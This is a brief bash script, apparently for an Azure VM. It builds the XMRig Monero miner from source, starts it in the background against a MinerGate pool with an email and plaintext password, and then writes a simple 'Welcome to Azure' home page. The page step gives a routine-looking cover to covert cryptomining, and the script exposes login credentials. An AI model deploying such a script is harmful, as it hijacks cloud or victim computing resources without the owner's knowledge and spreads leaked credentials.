#!/bin/bash
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build
cd build
cmake ..
make
./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u zhmuha@yahoo.com -p Barb#dos66 -t 4 --donate-level=1 --av=2 -B
# Set the home page.
echo "<html><body><h2>Welcome to Azure! My name is Scherny.</h2></body></html>" | sudo tee -a /var/www/html/index.html
